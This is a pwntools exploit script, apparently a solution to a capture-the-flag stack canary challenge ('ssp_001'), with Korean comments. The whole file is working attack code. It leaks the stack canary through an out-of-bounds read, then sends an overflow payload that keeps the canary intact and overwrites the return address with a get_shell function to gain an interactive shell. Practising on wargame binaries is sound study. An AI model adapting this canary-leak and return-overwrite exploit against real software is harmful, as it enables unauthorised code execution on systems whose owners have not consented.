from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

def start():
    if args.REMOTE:
        host=''
        port=0
        return remote(host,port)
    else:
        return process("./ssp_001")
p = start()

canary = ""

for _input in [131,130,129,128]:
    p.sendlineafter(b'> ',b"P")
    p.sendlineafter(b'Element index : ',str(_input))
    p.recvuntil(b'is : ')
    canary_bytes = p.recvn(0x2).decode('utf-8')
    canary +=canary_bytes


#print(f"{stack_canary} is the current stack canary value!")
canary = int(canary, 16)

#getshell 주소 찾기

get_shell_addr = 0x080486b9

payload = b'A' * 0x40
payload += p32(canary)
payload += b'B' * 0x4 #더미 값
payload += b'C' * 0x4 #sfp 덮어쓰기
payload += p32(get_shell_addr) #리틀엔디언으로 표현

#exploit
p.sendlineafter(b"> ", b"E")
p.sendlineafter(b"Name Size : ", str(len(payload)))
p.sendlineafter(b"Name : ", payload)


p.interactive()
